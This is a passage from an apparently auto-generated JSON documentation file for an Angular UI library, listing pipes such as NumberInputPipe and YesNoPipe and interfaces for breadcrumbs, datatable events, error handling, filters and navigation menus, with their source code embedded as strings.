              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "5"
            },
            {
              "name": "dynamicFractionSize",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "false"
            }
          ],
          "optional": false,
          "returnType": "string",
          "typeParameters": [],
          "line": 43,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "value",
              "type": "number | string | null",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "fractionSize",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "5",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "dynamicFractionSize",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "false",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "ngname": "numberInput",
      "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\n\nconst PADDING = '000000000';\n\n@Pipe({ name: 'numberInput' })\nexport class NumberInputPipe implements PipeTransform {\n\n  private DECIMAL_SEPARATOR = ',';\n  private THOUSANDS_SEPARATOR = ' ';\n\n  private handleIntegerAndFractions(integer: string, fraction: string, fractionSize: number, dynamicFractionSize = false) {\n    const negative = integer.startsWith('-');\n    if ( ( integer === '' && fraction === '' ) || integer === 'NaN' ) {\n      return { integer: null, fraction: null };\n    } else if ( integer === '' ) {\n      integer = '0';\n    } else if ( integer.includes('-') ) {\n      if ( integer === '-' ) {\n        integer = '-0';\n      } else {\n        integer = '-' + parseInt(integer, 10) * -1; // To handle -0.123\n      }\n    } else {\n      integer = parseInt(integer, 10) + '';\n    }\n\n    if ( fraction.length > fractionSize && !dynamicFractionSize ) {\n      const number = parseFloat('0.' + fraction);\n      const exp = Math.pow(10, fractionSize);\n      const rounded = Math.round(number * exp) / exp;\n      if ( rounded === 1 ) {\n        const addValue = negative ? -1 : 1;\n        integer = ( parseInt(integer || '0', 10) + addValue ) + '';\n        fraction = '';\n      } else {\n        fraction = ( rounded + '' ).split('.')[ 1 ] || '';\n      }\n    }\n\n    return { integer, fraction };\n  }\n\n  transform(value: number | string | null, fractionSize: number = 5, dynamicFractionSize = false): string {\n    if ( !value && value !== 0 ) {\n      return '';\n    }\n    value = value + '';\n    // eslint-disable-next-line\n    const re = /[\\^¨~`´_:;!\"#¤%&/()=@£$€{\\[]/g;\n    value = value.replace(re, '');\n\n    value = value.replace('.', this.DECIMAL_SEPARATOR);\n    const [ integerSplit, fractionSplit = '' ] = value.split(this.DECIMAL_SEPARATOR);\n    let { integer, fraction } = this.handleIntegerAndFractions(integerSplit, fractionSplit, fractionSize, dynamicFractionSize);\n    if ( integer === null ) {\n      return '';\n    }\n    if ( dynamicFractionSize ) {\n      fraction = fraction ? this.DECIMAL_SEPARATOR + ( fraction ) : '';\n    } else {\n      fraction = fractionSize > 0\n        ? this.DECIMAL_SEPARATOR + ( fraction + PADDING ).substring(0, fractionSize)\n        : '';\n    }\n\n    integer = integer.replace(/\\B(?=(\\d{3})+(?!\\d))/g, this.THOUSANDS_SEPARATOR);\n\n\n    return integer + fraction;\n  }\n\n\n  parse(value: string, fractionSize: number = 5, dynamicFractionSize = false): string {\n    value = value + '';\n    // eslint-disable-next-line\n    const re = /[\\^¨~`´_:;!\"#¤%&/()=@£$€{\\[]/g;\n    value = value.replace(re, '');\n    value = value.replace('.', this.DECIMAL_SEPARATOR);\n    // eslint-disable-next-line prefer-const\n    let [ integerSplit, fractionSplit = '' ] = ( value || '' ).split(this.DECIMAL_SEPARATOR);\n\n    integerSplit = integerSplit.replace(new RegExp(this.THOUSANDS_SEPARATOR, 'g'), '');\n    // eslint-disable-next-line prefer-const\n    let { integer, fraction } = this.handleIntegerAndFractions(integerSplit, fractionSplit, fractionSize, dynamicFractionSize);\n\n    if ( dynamicFractionSize ) {\n      fraction = fraction ? `.${fraction}` : '';\n    } else {\n      fraction = fractionSize > 0\n        ? '.' + ( fraction + PADDING ).substring(0, fractionSize)\n        : '';\n    }\n\n\n    if ( !integer ) {\n      return '';\n    }\n    return integer + fraction;\n  }\n\n}\n"
    },
    {
      "name": "YesNoPipe",
      "id": "pipe-YesNoPipe-f01b215f10462ecd1336ab5838a0b0477810365e83730d5617f17f7b9a4b06d284f17e05a19d6589058f2d742ee90c9f2a7fe4c733bf98bc77e03546d09756f9",
      "file": "libs/core/src/lib/sto-pipes/yes-no.ts",
      "type": "pipe",
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
      "properties": [],
      "methods": [
        {
          "name": "transform",
          "args": [
            {
              "name": "value",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "ignoreNulls",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "false"
            }
          ],
          "optional": false,
          "returnType": "string",
          "typeParameters": [],
          "line": 4,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "value",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "ignoreNulls",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "false",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "ngname": "yesNo",
      "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\n@Pipe({name: 'yesNo'})\nexport class YesNoPipe implements PipeTransform {\n  transform(value: boolean, ignoreNulls = false): string {\n    let valueStr = '';\n    if (ignoreNulls) {\n      valueStr = value ? 'Yes' : value === false ? 'No' : '';\n    } else {\n      valueStr = value ? 'Yes' : 'No';\n    }\n    return valueStr;\n\n  }\n}\n"
    }
  ],
  "interfaces": [
    {
      "name": "Activate",
      "id": "interface-Activate-ea144294bd9add562c3834ee4283ecd1b5da45c74a70d0183ab65905ebc723213e782f4a42e57cdf3314d4bd8c9342b8ef92336e15362c9903f80263b1cedfcf",
      "file": "libs/datatable/src/lib/sto-datatable/events.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "import { Column } from './columns';\n\nexport interface ContextMenu {\n  event: MouseEvent | KeyboardEvent;\n  column: Column;\n}\n\ninterface RowCtx<T extends Record<string, unknown>> {\n  row: T;\n  index: number;\n}\n\nexport type RowContextMenu<T extends Record<string, unknown>> = ContextMenu & RowCtx<T>;\nexport type HeaderContextMenu = ContextMenu;\n\ninterface Activate<T extends Record<string, unknown>> {\n  row: T;\n  event: MouseEvent | KeyboardEvent;\n  index: number;\n  rowEl?: HTMLDivElement;\n}\n\nexport interface RowSelection<T extends Record<string, unknown>> extends Activate<T> {\n  event: MouseEvent | KeyboardEvent;\n}\n\nexport interface RowActivation<T extends Record<string, unknown>> extends Activate<T> {\n  event: KeyboardEvent;\n}\n",
      "properties": [
        {
          "name": "event",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MouseEvent | KeyboardEvent",
          "optional": false,
          "description": "",
          "line": 18
        },
        {
          "name": "index",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 19
        },
        {
          "name": "row",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "T",
          "optional": false,
          "description": "",
          "line": 17
        },
        {
          "name": "rowEl",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "HTMLDivElement",
          "optional": true,
          "description": "",
          "line": 20
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "methods": []
    },
    {
      "name": "Breadcrumb",
      "id": "interface-Breadcrumb-b7e649202d6709176916eec8e6f09d9987524f0c268fed5675aab6a2e7cb461354f4bc98037f7db5d5e47ed8e63fa42302824c70451e8d61cb1b4c546ad2229e",
      "file": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "import { EventEmitter, InjectionToken } from '@angular/core';\n\nexport interface Breadcrumb {\n  label: string;\n  command?: (...args: Array<unknown>) => void;\n  segment?: string;\n  disabled?: boolean;\n  eventEmitter?: EventEmitter<unknown>;\n  url?: string;\n}\n\nexport interface BreadcrumbConfig { icon?: string; svgIcon?: string; text?: string };\n\nexport const NAVIGATION_HOME_ICON = new InjectionToken<BreadcrumbConfig>('sto-home-icon');\n",
      "properties": [
        {
          "name": "command",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "function",
          "optional": true,
          "description": "",
          "line": 5
        },
        {
          "name": "disabled",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": true,
          "description": "",
          "line": 7
        },
        {
          "name": "eventEmitter",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "EventEmitter<>",
          "optional": true,
          "description": "",
          "line": 8
        },
        {
          "name": "label",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 4
        },
        {
          "name": "segment",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 6
        },
        {
          "name": "url",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 9
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "methods": []
    },
    {
      "name": "BreadcrumbConfig",
      "id": "interface-BreadcrumbConfig-b7e649202d6709176916eec8e6f09d9987524f0c268fed5675aab6a2e7cb461354f4bc98037f7db5d5e47ed8e63fa42302824c70451e8d61cb1b4c546ad2229e",
      "file": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "import { EventEmitter, InjectionToken } from '@angular/core';\n\nexport interface Breadcrumb {\n  label: string;\n  command?: (...args: Array<unknown>) => void;\n  segment?: string;\n  disabled?: boolean;\n  eventEmitter?: EventEmitter<unknown>;\n  url?: string;\n}\n\nexport interface BreadcrumbConfig { icon?: string; svgIcon?: string; text?: string };\n\nexport const NAVIGATION_HOME_ICON = new InjectionToken<BreadcrumbConfig>('sto-home-icon');\n",
      "properties": [
        {
          "name": "icon",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 12
        },
        {
          "name": "svgIcon",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 12
        },
        {
          "name": "text",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 12
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "methods": []
    },
    {
      "name": "BreakpointConfig",
      "id": "interface-BreakpointConfig-e445c114a94a880f4e19adbe60b844b93b2d147c2d1c348a323f971cda2e77f7091c36f0349c4a5305b582cb6ab5d85f00064ac77cc629943c62048d9c46a4e4",
      "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "import { AfterViewInit, ContentChildren, Directive, ElementRef, HostBinding, Input, OnDestroy, QueryList } from '@angular/core';\n\ninterface BreakpointConfig {\n  2: number;\n  4: number;\n}\n\nconst getClass = (width: number, small = 400, large = 800) => {\n  let cols = 1;\n  if ( width > small ) {\n    cols += 1;\n  }\n  if ( width > large ) {\n    cols += 2;\n  }\n  return `sto-f-grid--${cols}`;\n};\n\nconst ALL_GRIDS = [ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ];\n\n@Directive({ selector: '[stoGridSpacer]' })\nexport class StoGridSpacerDirective {\n  @HostBinding('class.sto-f-grid__col')\n  @HostBinding('class.sto-f-grid__col--spacer')\n  useClass = true;\n}\n\n@Directive({ selector: '[stoGridColumn]' })\nexport class StoGridColumnDirective {\n  @HostBinding('class.sto-f-grid__col')\n  useClass = true;\n  @HostBinding('class.sto-f-grid__col--2')\n  @Input()\n  stoGridColumnDouble: boolean;\n\n}\n\n@Directive({\n  selector: '[stoGrid]',\n  exportAs: 'stoGrid'\n})\nexport class StoGridDirective implements AfterViewInit, OnDestroy {\n  @HostBinding('style.max-width.px')\n  @Input()\n  maxWidth = 1000;\n  @HostBinding('style.min-width.px')\n  @Input()\n  minWidth = 250;\n  @HostBinding('class.sto-f-grid')\n  baseClass = true;\n  @ContentChildren(StoGridColumnDirective, { read: ElementRef })\n  columns: QueryList<ElementRef<HTMLElement>>;\n  @Input()\n  breakpoints: BreakpointConfig;\n\n  private observer: ResizeObserver;\n\n  constructor(\n    private elRef: ElementRef<HTMLElement>,\n  ) {\n  }\n\n  ngAfterViewInit() {\n    const el = this.elRef.nativeElement as HTMLElement;\n    this.observer = new ResizeObserver(entries => {\n      for ( const entry of entries ) {\n        const cr = entry.contentRect;\n        const { width } = cr;\n        const breakpoints = this.breakpoints || { 2: 400, 4: 800 };\n        const gridType = getClass(width, breakpoints[ 2 ], breakpoints[ 4 ]);\n        if ( !el.classList.contains(gridType) ) {\n          el.classList.remove(...ALL_GRIDS);\n          el.classList.add(gridType);\n        }\n      }\n    });\n    this.observer.observe(this.elRef.nativeElement);\n  }\n\n  ngOnDestroy() {\n    if ( this.observer ) {\n      this.observer.disconnect();\n    }\n  }\n\n}\n\n",
      "properties": [
        {
          "name": "2",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 4
        },
        {
          "name": "4",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 5
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "methods": []
    },
    {
      "name": "Chainable",
      "id": "interface-Chainable-cb612385d81b07be0aad52bfcb00cbe7bc4da71bb724b45a152d9ab4e7d4b2760a0b20ca8bca793febb910c5eecfd0756929a822af47a6ff4c538299ea673b8c",
      "file": "apps/oilmod-web-e2e/src/support/commands.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "declare namespace Cypress {\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  interface Chainable<Subject> {\n    login(email: string, password: string): void;\n  }\n}\n//\n// -- This is a parent command --\nCypress.Commands.add('login', (email, password) => {\n  console.log('Custom command example: Login', email, password);\n});\n//\n// -- This is a child command --\n// Cypress.Commands.add(\"drag\", { prevSubject: 'element'}, (subject, options) => { ... })\n//\n//\n// -- This is a dual command --\n// Cypress.Commands.add(\"dismiss\", { prevSubject: 'optional'}, (subject, options) => { ... })\n//\n//\n// -- This will overwrite an existing command --\n// Cypress.Commands.overwrite(\"visit\", (originalFn, url, options) => { ... })\n",
      "properties": [],
      "indexSignatures": [],
      "kind": 167,
      "methods": [
        {
          "name": "login",
          "args": [
            {
              "name": "email",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "password",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 15,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "email",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "password",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ]
    },
    {
      "name": "ContextMenu",
      "id": "interface-ContextMenu-ea144294bd9add562c3834ee4283ecd1b5da45c74a70d0183ab65905ebc723213e782f4a42e57cdf3314d4bd8c9342b8ef92336e15362c9903f80263b1cedfcf",
      "file": "libs/datatable/src/lib/sto-datatable/events.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "import { Column } from './columns';\n\nexport interface ContextMenu {\n  event: MouseEvent | KeyboardEvent;\n  column: Column;\n}\n\ninterface RowCtx<T extends Record<string, unknown>> {\n  row: T;\n  index: number;\n}\n\nexport type RowContextMenu<T extends Record<string, unknown>> = ContextMenu & RowCtx<T>;\nexport type HeaderContextMenu = ContextMenu;\n\ninterface Activate<T extends Record<string, unknown>> {\n  row: T;\n  event: MouseEvent | KeyboardEvent;\n  index: number;\n  rowEl?: HTMLDivElement;\n}\n\nexport interface RowSelection<T extends Record<string, unknown>> extends Activate<T> {\n  event: MouseEvent | KeyboardEvent;\n}\n\nexport interface RowActivation<T extends Record<string, unknown>> extends Activate<T> {\n  event: KeyboardEvent;\n}\n",
      "properties": [
        {
          "name": "column",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Column",
          "optional": false,
          "description": "",
          "line": 5
        },
        {
          "name": "event",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MouseEvent | KeyboardEvent",
          "optional": false,
          "description": "",
          "line": 4
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "methods": []
    },
    {
      "name": "ErrorHandler",
      "id": "interface-ErrorHandler-9a4092fb666179fac8a9fe58b5c082712782f54524bd848b041acefffff67a9bf041f2ae828003c1bacb8417305569cbe3d59a53975d8d122dabb84a89601f1d",
      "file": "libs/error-handler/src/lib/error-handler/error-handler.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "import { HttpErrorResponse } from '@angular/common/http';\nimport { HttpError } from './http-error';\n\n/**\n * Public interface for the error handler class.\n */\nexport interface StoErrorHandler {\n  [ code: number ]: Handler;\n\n  getErrorText?: (err: HttpErrorResponse) => string;\n}\n\n/**\n * Internal interface for our errorhandler.\n */\nexport interface ErrorHandler extends StoErrorHandler {\n  handler: (err: HttpErrorResponse, handler?: Handler) => void;\n  defaultHandler: Handler;\n}\n\n/**\n * Interface for the ErrorLogger injection token.\n */\nexport interface ErrorLogger {\n  log: (arg0: HttpError) => void;\n}\n\n// Expected signature for error handlers.\nexport type Handler = (err: HttpErrorResponse) => HttpError;\n\n",
      "properties": [
        {
          "name": "defaultHandler",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Handler",
          "optional": false,
          "description": "",
          "line": 18
        },
        {
          "name": "handler",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "function",
          "optional": false,
          "description": "",
          "line": 17
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "description": "<p>Internal interface for our errorhandler.</p>\n",
      "rawdescription": "\n\nInternal interface for our errorhandler.\n",
      "methods": [],
      "extends": "StoErrorHandler"
    },
    {
      "name": "ErrorLogger",
      "id": "interface-ErrorLogger-9a4092fb666179fac8a9fe58b5c082712782f54524bd848b041acefffff67a9bf041f2ae828003c1bacb8417305569cbe3d59a53975d8d122dabb84a89601f1d",
      "file": "libs/error-handler/src/lib/error-handler/error-handler.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "import { HttpErrorResponse } from '@angular/common/http';\nimport { HttpError } from './http-error';\n\n/**\n * Public interface for the error handler class.\n */\nexport interface StoErrorHandler {\n  [ code: number ]: Handler;\n\n  getErrorText?: (err: HttpErrorResponse) => string;\n}\n\n/**\n * Internal interface for our errorhandler.\n */\nexport interface ErrorHandler extends StoErrorHandler {\n  handler: (err: HttpErrorResponse, handler?: Handler) => void;\n  defaultHandler: Handler;\n}\n\n/**\n * Interface for the ErrorLogger injection token.\n */\nexport interface ErrorLogger {\n  log: (arg0: HttpError) => void;\n}\n\n// Expected signature for error handlers.\nexport type Handler = (err: HttpErrorResponse) => HttpError;\n\n",
      "properties": [
        {
          "name": "log",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "function",
          "optional": false,
          "description": "",
          "line": 25
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "description": "<p>Interface for the ErrorLogger injection token.</p>\n",
      "rawdescription": "\n\nInterface for the ErrorLogger injection token.\n",
      "methods": []
    },
    {
      "name": "FilterList",
      "id": "interface-FilterList-cec91c7cae29d7588939b1b087ee6ae84975299f48c220f1f423ee7fe8470062ca9feeca1cdfa3bd6c45773a073b62845b5eaba06beade4aa010ab2acec43b46",
      "file": "libs/common/src/lib/sto-filter/filter.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "import { UntypedFormBuilder, UntypedFormGroup } from '@angular/forms';\nimport { Directive, EventEmitter, Input, OnDestroy, OnInit, Output } from '@angular/core';\nimport { Observable, OperatorFunction, Subject } from 'rxjs';\nimport { debounceTime, startWith, takeUntil } from 'rxjs/operators';\n\nexport interface FilterList {\n  key: string;\n  value: string;\n  index?: number;\n}\n\n/**\n * Abstract class utilized to decrease boiler plate for filters.\n * Given that most filters are identical in their base setup (a reactive form, using sto-filter-panel etc), this simplify writing filters.\n * It also allows you to have filter chips in your filter title with a base implementation (only needs a formConfig & serializer fn)\n */\n@Directive()\nexport abstract class FilterForm<T extends Record<string, unknown>> implements OnInit, OnDestroy {\n  // FormBuilder config\n  abstract formConfig: { [ key: string ]: unknown };\n  // Serializer function\n  abstract serializer: OperatorFunction<T, FilterList[]>;\n  protected destroyed$ = new Subject();\n  // Most filters will emit a filterChanged event\n  @Output()\n  filterChanged = new EventEmitter<T>();\n  // Initial value of the filter\n  @Input()\n  value: T;\n\n  // Form group\n  public form: UntypedFormGroup;\n  // Chip value. See {@link FilterList}\n  public filter$: Observable<FilterList[]>;\n\n  constructor(private fb: UntypedFormBuilder) {\n  }\n\n  ngOnInit() {\n    this.form = this.fb.group(this.formConfig);\n    this.form.reset(this.value || {});\n    this.filter$ = this.form\n      .valueChanges\n      .pipe(startWith<T>(this.form.value), this.serializer);\n    this.form.valueChanges\n      .pipe(\n        startWith(this.form.value),\n        debounceTime(250),\n        takeUntil(this.destroyed$)\n      ).subscribe(value => this.filterChanged.emit(value));\n  }\n\n  ngOnDestroy() {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n  }\n\n  /**\n   * This function clears the value for the given key.\n   * If index is passed in, it assumes the value for the key is an array, and removes the value at the given index.\n   * @param key\n   * @param index\n   */\n  public clearFilter(key: string, index?: number) {\n    if ( index || index === 0 ) {\n      const val = [...(this.form.get(key)?.value ?? [])];\n      val.splice(index, 1);\n      this.form.get(key)?.reset(val);\n    } else {\n      this.form.get(key)?.reset();\n    }\n  }\n\n  // Util function to resize tables. Looking to get rid of this...\n  public toggled() {\n    setTimeout(() => window.dispatchEvent(new Event('resize')), 300);\n  }\n\n}\n",
      "properties": [
        {
          "name": "index",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": true,
          "description": "",
          "line": 9
        },
        {
          "name": "key",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 7
        },
        {
          "name": "value",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 8
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "methods": []
    },
    {
      "name": "MenuGroup",
      "id": "interface-MenuGroup-d1db87f4b4256930432e4b4c99dc26352ed42dd3abf901ac6a9a01f780f9deb93fdd751c31a234650059cfa39559f5b19f5116f02c2e6fc538e354125e447ffd",
      "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "export type Menu = {\n  groups: MenuGroup[];\n} & Record<string, unknown>;\n\nexport interface MenuGroup {\n  hasDivider?: boolean;\n  icon?: string;\n  svgIcon?: boolean;\n  items: MenuItem[];\n  name?: string;\n}\n\nexport interface MenuItem {\n  id?: string;\n  name?: string;\n  icon?: string;\n  svgIcon?: boolean;\n  command?: MenuItemCommand;\n  error?: string;\n}\n\nexport interface MenuItemCommand {\n  type: MenuItemTypes;\n  /**\n   * For internal urls: RouterCommands.\n   * For external urls, should just be array with one element (the full url)\n   */\n  arguments: Array<string | number>;\n}\n\nexport interface NavigateCommand {\n  $event: MouseEvent | KeyboardEvent;\n  command?: Array<string | number>;\n}\n\nexport enum MenuItemTypes {\n  External = 'externalLink',\n  ExternalNew = 'externalLinkNewWindow',\n  Internal = 'internalLink',\n  Navigate = 'navigate'\n}\n",
      "properties": [
        {
          "name": "hasDivider",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": true,
          "description": "",
          "line": 6
        },
        {
          "name": "icon",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 7
        },
        {
          "name": "items",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MenuItem[]",
          "optional": false,
          "description": "",
          "line": 9
        },
        {
          "name": "name",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 10
        },
        {
          "name": "svgIcon",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": true,
          "description": "",
          "line": 8
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "methods": []
    },
    {
      "name": "MenuItem",
      "id": "interface-MenuItem-d1db87f4b4256930432e4b4c99dc26352ed42dd3abf901ac6a9a01f780f9deb93fdd751c31a234650059cfa39559f5b19f5116f02c2e6fc538e354125e447ffd",
      "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "export type Menu = {\n  groups: MenuGroup[];\n} & Record<string, unknown>;\n\nexport interface MenuGroup {\n  hasDivider?: boolean;\n  icon?: string;\n  svgIcon?: boolean;\n  items: MenuItem[];\n  name?: string;\n}\n\nexport interface MenuItem {\n  id?: string;\n  name?: string;\n  icon?: string;\n  svgIcon?: boolean;\n  command?: MenuItemCommand;\n  error?: string;\n}\n\nexport interface MenuItemCommand {\n  type: MenuItemTypes;\n  /**\n   * For internal urls: RouterCommands.\n   * For external urls, should just be array with one element (the full url)\n   */\n  arguments: Array<string | number>;\n}\n\nexport interface NavigateCommand {\n  $event: MouseEvent | KeyboardEvent;\n  command?: Array<string | number>;\n}\n\nexport enum MenuItemTypes {\n  External = 'externalLink',\n  ExternalNew = 'externalLinkNewWindow',\n  Internal = 'internalLink',\n  Navigate = 'navigate'\n}\n",
      "properties": [
        {
          "name": "command",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MenuItemCommand",
          "optional": true,
          "description": "",
          "line": 18
        },
        {
          "name": "error",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 19
        },
        {
          "name": "icon",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 16
        },
        {
          "name": "id",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 14
        },
        {
          "name": "name",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 15
        },
        {
          "name": "svgIcon",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": true,
          "description": "",
          "line": 17
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "methods": []
    },
    {
      "name": "MenuItemCommand",
      "id": "interface-MenuItemCommand-d1db87f4b4256930432e4b4c99dc26352ed42dd3abf901ac6a9a01f780f9deb93fdd751c31a234650059cfa39559f5b19f5116f02c2e6fc538e354125e447ffd",
      "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "export type Menu = {\n  groups: MenuGroup[];\n} & Record<string, unknown>;\n\nexport interface MenuGroup {\n  hasDivider?: boolean;\n  icon?: string;\n  svgIcon?: boolean;\n  items: MenuItem[];\n  name?: string;\n}\n\nexport interface MenuItem {\n  id?: string;\n  name?: string;\n  icon?: string;\n  svgIcon?: boolean;\n  command?: MenuItemCommand;\n  error?: string;\n}\n\nexport interface MenuItemCommand {\n  type: MenuItemTypes;\n  /**\n   * For internal urls: RouterCommands.\n   * For external urls, should just be array with one element (the full url)\n   */\n  arguments: Array<string | number>;\n}\n\nexport interface NavigateCommand {\n  $event: MouseEvent | KeyboardEvent;\n  command?: Array<string | number>;\n}\n\nexport enum MenuItemTypes {\n  External = 'externalLink',\n  ExternalNew = 'externalLinkNewWindow',\n  Internal = 'internalLink',\n  Navigate = 'navigate'\n}\n",
      "properties": [
        {
          "name": "arguments",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Array<string | number>",
          "optional": false,
          "description": "<p>For internal urls: RouterCommands.\nFor external urls, should just be array with one element (the full url)</p>\n",
          "line": 28,
          "rawdescription": "\n\nFor internal urls: RouterCommands.\nFor external urls, should just be array with one element (the full url)\n"
        },
        {
          "name": "type",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MenuItemTypes",
          "optional": false,
          "description": "",
          "line": 23
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "methods": []
    },
    {
      "name": "NavigateCommand",
      "id": "interface-NavigateCommand-d1db87f4b4256930432e4b4c99dc26352ed42dd3abf901ac6a9a01f780f9deb93fdd751c31a234650059cfa39559f5b19f5116f02c2e6fc538e354125e447ffd",
      "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
